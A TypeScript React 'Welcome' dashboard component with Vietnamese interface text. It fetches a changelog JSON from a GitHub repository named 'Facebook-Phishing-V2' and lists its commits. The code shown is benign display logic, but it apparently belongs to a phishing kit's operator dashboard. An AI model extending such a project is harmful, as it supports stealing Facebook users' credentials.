import axios from "axios";
import { useEffect, useState } from "react";

interface Commit {
	type: string;
	scope?: string;
	description: string;
	author: string;
}

interface CommitGroup {
	date: string;
	messages: Commit[];
}

interface ChangeLogData {
	commits: CommitGroup[];
}

function Welcome() {
	const [changeLog, setChangeLog] = useState<ChangeLogData | null>(null);
	const [error, setError] = useState<string | null>(null);

	useEffect(() => {
		axios
			.get<ChangeLogData>(
				"https://raw.githubusercontent.com/tripleseven190504/Facebook-Phishing-V2/main/.github/UPDATE.json",
			)
			.then((res) => {
				if (res.data && Array.isArray(res.data.commits)) {
					setChangeLog(res.data);
				} else {
					setError("Không thể tải dữ liệu");
				}
			})
			.catch((err) => {
				console.error(err);
				setError("Không thể tải dữ liệu");
			});
	}, []);

	if (error) {
		return (
			<div className='container mx-auto px-4 py-8'>
				<h1 className='mb-4 text-4xl font-bold'>
					Chào mừng đến với Dashboard!
				</h1>
				<h2 className='text-xl font-semibold'>Lỗi:</h2>
				<p>{error}</p>
			</div>
		);
	}

	return (
		<div className='container mx-auto px-4 py-8'>
			<h1 className='mb-4 text-4xl font-bold'>Chào mừng đến với Dashboard!</h1>
			<h2 className='text-xl font-semibold'>Change Log:</h2>
			{changeLog &&
				changeLog.commits.map((commitGroup, index) => (
					<div key={index}>
						<h3 className='font-bold text-xl'>{commitGroup.date}</h3>
						<ul className=''>
							{commitGroup.messages.map((commit, idx) => (
								<li key={idx}>
									<strong>{commit.type}</strong>: {commit.description} - by{" "}
									<strong>{commit.author}</strong>
								</li>
							))}
						</ul>
					</div>
				))}
		</div>
	);
}

export default Welcome;
